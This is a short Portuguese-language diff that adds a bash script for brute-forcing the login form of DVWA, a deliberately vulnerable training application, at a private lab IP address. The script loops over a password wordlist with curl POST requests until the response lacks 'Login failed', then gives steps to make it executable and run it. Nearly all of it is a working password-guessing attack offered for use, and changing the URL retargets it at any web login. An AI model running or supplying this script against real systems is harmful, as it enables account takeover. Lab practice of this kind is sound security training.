@@ -1,0 +1,40 @@
+formulário de login do DVWA:
+
+bash
+#!/bin/bash
+
+# URL do login do DVWA
+url="http://192.168.56.101/dvwa/vulnerabilities/brute/"
+
+# Usuário alvo
+user="admin"
+
+# Caminho para a wordlist de senhas
+wordlist="wordlists/common-passwords.txt"
+
+# Loop para tentar todas as senhas na lista
+while read -r password; do
+  response=$(curl -s -X POST -d "username=$user&password=$password&Login=Login" "$url")
+  # Verifica se login foi bem-sucedido
+  if [[ $response != *"Login failed"* ]]; then
+    echo "Senha encontrada: $password"
+    break
+  fi
+done < "$wordlist"
+Como usar
+Salve o script acima em um arquivo, por exemplo, bruteforce_dvwa.sh.
+
+O arquivo de wordlist deve estar na pasta wordlists/common-passwords.txt, ou você pode editar o caminho no script.
+
+Dê permissão de execução:
+
+bash
+chmod +x bruteforce_dvwa.sh
+Execute o script:
+
+bash
+./bruteforce_dvwa.sh
+Observação
+Verifique o IP do seu ambiente DVWA e altere na variável url.
+
+Você pode criar suas próprias wordlists ou usar outras existentes para testes mais complexos.
